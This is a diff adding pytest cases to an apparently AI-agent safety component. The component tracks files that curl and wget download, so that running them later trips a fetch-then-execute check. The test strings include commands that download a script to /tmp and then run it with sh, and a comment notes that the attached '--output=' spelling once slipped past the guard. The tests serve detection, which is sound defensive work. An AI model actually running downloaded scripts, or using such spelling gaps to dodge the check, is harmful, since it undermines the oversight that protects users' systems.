@@ -100,6 +100,31 @@ def test_shell_fetchers_record_their_output_path(command, expected):
     )
 
 
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        ("curl --output=tool.sh https://x.io/a", ["tool.sh"]),
+        ("curl --output=/tmp/payload.sh https://x.io/a", ["/tmp/payload.sh"]),
+        ("wget --output-document=tool.sh https://x.io/a", ["tool.sh"]),
+    ],
+)
+def test_attached_output_values_record_the_download(command, expected):
+    # `--output=FILE` is the same flag as `--output FILE`; token comparison alone missed
+    # the attached spelling, so the fetch-then-execute floor stayed down afterwards.
+    assert prov.created_paths("run_shell", {"command": command}, None) == (
+        expected,
+        DOWNLOADED,
+    )
+
+
+def test_attached_output_value_feeds_the_downloaded_match(files):
+    files.record(
+        "run_shell", {"command": "curl https://x/p --output=/tmp/ws/p.sh"}, None, step=1
+    )
+    match = files.match("run_shell", {"command": "sh /tmp/ws/p.sh"}, step=2)
+    assert match is not None and match.downloaded
+
+
 def test_curl_capital_o_does_not_swallow_the_url():
     # `-o FILE` and `-O` are different curl flags; folding their case would record the URL
     # itself as the downloaded file.
